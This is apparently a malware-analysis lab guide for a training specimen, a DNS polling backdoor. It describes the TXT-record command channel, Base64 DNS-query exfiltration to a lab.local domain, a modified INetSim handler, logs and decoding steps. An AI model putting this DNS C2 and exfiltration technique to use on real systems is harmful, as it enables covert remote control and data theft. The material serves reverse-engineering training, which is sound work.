# A06_6 DNS Polling Backdoor

>[!Lab Note]
> This specimen requires a modified INetSim DNS implementation
> capable of returning custom TXT-record responses. Standard 
> INetSim installations will not provide the command-channel 
> behavior demonstrated in this sample.

## Summary

Establishes a lightweight DNS-based command-and-control (C2) channel
using native Windows DNS APIs.

The specimen demonstrates a simple DNS polling backdoor commonly
associated with malware families that attempt to blend command traffic
into normal name-resolution activity while minimizing direct network
connections to external services.

Unlike traditional HTTP- or TCP-based backdoors, the specimen receives
commands through DNS TXT record lookups and transmits execution results
through DNS query activity.

The sample periodically polls a command domain and processes received
instructions.

The configured command domain is:

```text
agent77.cmd.lab.local
```

The specimen performs the following workflow:

* Poll DNS TXT records for commands
* Decode Base64-encoded instruction data
* Execute supported commands
* Collect command output
* Encode output as Base64
* Exfiltrate results through DNS queries

The implementation intentionally limits functionality to a small number
of benign commands in order to generate controlled dynamic-analysis
artifacts suitable for malware reverse-engineering research.

No persistence mechanisms, privilege-escalation logic, process
injection, credential theft, or destructive actions are performed.

---

## Command and Control Summary

### DNS Polling

The specimen continuously polls:

```text
agent77.cmd.lab.local
```

using native Windows DNS APIs.

Specifically:

```text
DnsQuery_W()
```

is used to retrieve DNS TXT records from the configured command domain.

The polling interval is:

```text
30 seconds
```

between command retrieval attempts.

---

### Command Encoding

Commands returned by the DNS server are expected to be Base64 encoded.

Example:

```text
cGluZw==
```

decodes to:

```text
ping
```

The specimen decodes received TXT record contents and evaluates the
resulting command token.

---

### Supported Commands

#### ping

Executes:

```text
cmd.exe /c ping 127.0.0.1 -n 2
```

The resulting command output is captured and prepared for DNS-based
transmission.

---

#### exit

Terminates the polling loop and exits the specimen.

```text
exit
```

---

## Data Exfiltration Summary

Following command execution, output is:

1. Collected from StandardOutput
2. Converted to UTF-8 text
3. Base64 encoded
4. Split into DNS-safe chunks
5. Transmitted through DNS lookups

The specimen uses:

```text
30-character chunks
```

for transmission.

Generated DNS queries follow the format:

```text
data.<index>.<chunk>.cmd.lab.local
```

Example:

```text
data.0.SGVsbG9Xb3JsZA.cmd.lab.local
```

These DNS lookups serve as the exfiltration channel.

No direct socket communications are established.

---

## INetSim Configuration for A06_6

This sample expects INetSim to provide DNS resolution for the command
domain:

```text
agent77.cmd.lab.local
```

and to capture DNS-based command-and-control and exfiltration traffic.

---

### Edit INetSim Configuration

Edit:

```text
/etc/inetsim/inetsim.conf
```

Configure:

```text
dns_bind_port 53

dns_default_ip 192.168.67.5

dns_default_domainname lab.local

dns_static agent77.cmd.lab.local 192.168.67.3
```

---

### Configure TXT Command Responses

INetSim does not natively provide dynamic TXT-record command responses
suitable for this specimen.

For this controlled laboratory environment, the DNS service
implementation was modified to return Base64-encoded command data when
the specimen queries:

```text
agent77.cmd.lab.local
```

Edit:

```bash
sudo nano /usr/share/perl5/INetSim/DNS.pm
```

Example command:

```text
ping
```

Base64 representation:

```text
cGluZw==
```

Example modification:

```perl
elsif ($querytype eq "TXT") {
        my $rdata;
        # http://www.ietf.org/rfc/rfc4892.txt
        if ($queryclass eq "CH" && ($queryname =~ /\A(version|hostname)\.bind/i)) {
            $rdata = INetSim::Config::getConfigParameter("DNS_Version");
        }
        elsif ($queryname =~ /\A[0-9a-zA-Z-.]{1,255}\z/) {
            if ($queryname =~ /\Aagent77/i) {
                # Base64 representation of 'ping'
                $rdata = "cGluZw==";
            }
            else {
                $rdata = "this is a txt record";
            }
            push @ans, Net::DNS::RR->new("$queryname $ttl $queryclass TXT \"$rdata\"");
            push @logans, "$queryname $ttl $queryclass $querytype \"$rdata\"");
            $resultcode = "NOERROR";
        }
        else {
            # invalid queryname
            $resultcode = "NXDOMAIN";
        }
}
```

---

### Expected DNS Exfiltration Activity

After command execution, the specimen captures command output, converts
the output to Base64, splits the data into 30-character chunks, and
transmits each chunk through DNS queries.

The specimen uses:

```text
30-character chunks
```

This chunk size helps ensure the generated DNS labels remain within
standard DNS naming constraints while preserving reliable transmission.

Example specimen console output:

```text
-> [0] Transmitting Frame Domain: "data.0.DQpQaW5naW5nIDEyNy4wLjAuMSB3aX.cmd.lab.local"
-> [1] Transmitting Frame Domain: "data.1.RoIDMyIGJ5dGVzIG9mIGRhdGE6DQpS.cmd.lab.local"
-> [2] Transmitting Frame Domain: "data.2.ZXBseSBmcm9tIDEyNy4wLjAuMTogYn.cmd.lab.local"
...
-> [14] Transmitting Frame Domain: "data.14.IEF2ZXJhZ2UgPSAwbXMNCg.cmd.lab.local"
```

Corresponding INetSim log activity:

```text
[dns_53_tcp_udp] recv: Query Type A, Class IN, Name data.0.DQpQaW5naW5nIDEyNy4wLjAuMSB3aX.cmd.lab.local
[dns_53_tcp_udp] send: data.0.DQpQaW5naW5nIDEyNy4wLjAuMSB3aX.cmd.lab.local 3600 IN A 192.168.67.5

[dns_53_tcp_udp] recv: Query Type A, Class IN, Name data.1.RoIDMyIGJ5dGVzIG9mIGRhdGE6DQpS.cmd.lab.local
[dns_53_tcp_udp] send: data.1.RoIDMyIGJ5dGVzIG9mIGRhdGE6DQpS.cmd.lab.local 3600 IN A 192.168.67.5

...

[dns_53_tcp_udp] recv: Query Type A, Class IN, Name data.14.IEF2ZXJhZ2UgPSAwbXMNCg.cmd.lab.local
[dns_53_tcp_udp] send: data.14.IEF2ZXJhZ2UgPSAwbXMNCg.cmd.lab.local 3600 IN A 192.168.67.5
```

These DNS requests contain Base64-encoded fragments of the command
output and collectively represent the DNS-based exfiltration channel.

---

### Reconstructing Exfiltrated Output

Because each DNS query contains a numbered fragment, the original
output can be reconstructed by ordering the fragments according to
their index values.

Example:

```text
data.0
data.1
data.2
...
data.14
```

An analyst can reconstruct the original command output by collecting
the Base64 fragments from query indices `0` through `14` and
concatenating them in order.

Example reconstructed data:

```text
DQpQaW5naW5nIDEyNy4wLjAuMSB3aXRoIDMyIGJ5dGVzIG9mIGRhdGE6DQpSZXBseSBmcm9tIDEyNy4wLjAuMTogYnl0ZXM9MzIgdGltZTwxbXMgVFRMPTEyOA0KUmVwbHkgZnJvbSAxMjcuMC4wLjE6IGJ5dGVzPTMyIHRpbWU8MW1zIFRUTD0xMjgNCg0KUGluZyBzdGF0aXN0aWNzIGZvciAxMjcuMC4wLjE6DQogICAgUGFja2V0czogU2VudCA9IDIsIFJlY2VpdmVkID0gMiwgTG9zdCA9IDAgKDAlIGxvc3MpLA0KQXBwcm94aW1hdGUgcm91bmQgdHJpcCB0aW1lcyBpbiBtaWxsaS1zZWNvbmRzOg0KICAgIE1pbmltdW0gPSAwbXMsIE1heGltdW0gPSAwbXMsIEF2ZXJhZ2UgPSAwbXMNCg
```

The reconstructed stream can be decoded using standard Base64 tools.

Example:

```bash
echo -n "DQpQaW5naW5nIDEyNy4wLjAuMSB3aXRoIDMyIGJ5dGVzIG9mIGRhdGE6DQpSZXBseSBmcm9tIDEyNy4wLjAuMTogYnl0ZXM9MzIgdGltZTwxbXMgVFRMPTEyOA0KUmVwbHkgZnJvbSAxMjcuMC4wLjE6IGJ5dGVzPTMyIHRpbWU8MW1zIFRUTD0xMjgNCg0KUGluZyBzdGF0aXN0aWNzIGZvciAxMjcuMC4wLjE6DQogICAgUGFja2V0czogU2VudCA9IDIsIFJlY2VpdmVkID0gMiwgTG9zdCA9IDAgKDAlIGxvc3MpLA0KQXBwcm94aW1hdGUgcm91bmQgdHJpcCB0aW1lcyBpbiBtaWxsaS1zZWNvbmRzOg0KICAgIE1pbmltdW0gPSAwbXMsIE1heGltdW0gPSAwbXMsIEF2ZXJhZ2UgPSAwbXMNCg" | base64 -d
```

Decoded output:

```text
Pinging 127.0.0.1 with 32 bytes of data:
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128

Ping statistics for 127.0.0.1:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

This demonstrates successful command retrieval, execution, DNS-based
output exfiltration, analyst reconstruction, and recovery of the
original command output.

---

## To Execute A06_6_DNS_Backdoor

After INetSim has been configured, execute:

```powershell
.\A06-Backdoor-Persistence-Service-Foothold\A06_6\bin\A06_6_DNS_Backdoor.exe
```

The specimen should begin polling:

```text
agent77.cmd.lab.local
```

every:

```text
30 seconds
```

Monitor DNS activity on the INetSim server using:

```bash
tail -f /var/log/inetsim/service.log
```

Successful execution should generate:

* Repeated DNS TXT lookups
* DNS-based command retrieval
* Child process creation for supported commands
* DNS query-based output exfiltration

---

## Expected Dynamic Analysis Artifacts

### DNS TXT Command Retrieval

```text
agent77.cmd.lab.local
```

Observed repeatedly at 30-second intervals.

---

### DNS Exfiltration Queries

```text
data.<index>.<chunk>.cmd.lab.local
```

Generated following successful command execution.

---

### Child Process Creation

```text
cmd.exe
```

Command line:

```text
cmd.exe /c ping 127.0.0.1 -n 2
```

---

### DNS API Usage

```text
DnsQuery_W()
```

Used for:

* TXT record retrieval
* Exfiltration lookup generation

---

### Console Execution Artifacts

The specimen emits diagnostic output indicating:

* DNS polling activity
* TXT record retrieval
* Base64 decoding
* Command execution
* Data chunking
* Exfiltration progress

---

### Expected Dynamic Signals

Dynamic analysis tools may observe:

* Periodic DNS TXT queries
* Base64-encoded command retrieval
* Child process execution via `cmd.exe`
* DNS query-based exfiltration activity
* Repeated polling intervals
* No persistence behavior
* No file creation
* No privilege escalation
* No code injection

---

#########################################################################

# High-Level DNS Backdoor Flow

1. Start the DNS backdoor sample:

   ```text
   A06_6_DNS_Backdoor.exe
   ```

2. Configure the command domain:

   ```text
   agent77.cmd.lab.local
   ```

3. Enter the continuous polling loop

4. Perform a DNS TXT lookup using:

   ```text
   DnsQuery_W()
   ```

5. Receive DNS TXT record contents

6. Decode Base64 command data

7. Compare against the previously executed command

8. Ignore duplicate commands

9. Process new command token

10. If command equals:

    ```text
    ping
    ```

    execute:

    ```text
    cmd.exe /c ping 127.0.0.1 -n 2
    ```

11. Capture StandardOutput contents

12. Convert output to Base64

13. Split encoded output into DNS-safe chunks

14. Construct DNS exfiltration domains:

    ```text
    data.<index>.<chunk>.cmd.lab.local
    ```

15. Issue DNS queries for each chunk

16. Transmit command output through DNS traffic

17. Sleep for:

    ```text
    30 seconds
    ```

18. Repeat the polling cycle

19. Continue until command:

    ```text
    exit
    ```

    is received

20. Terminate execution cleanly
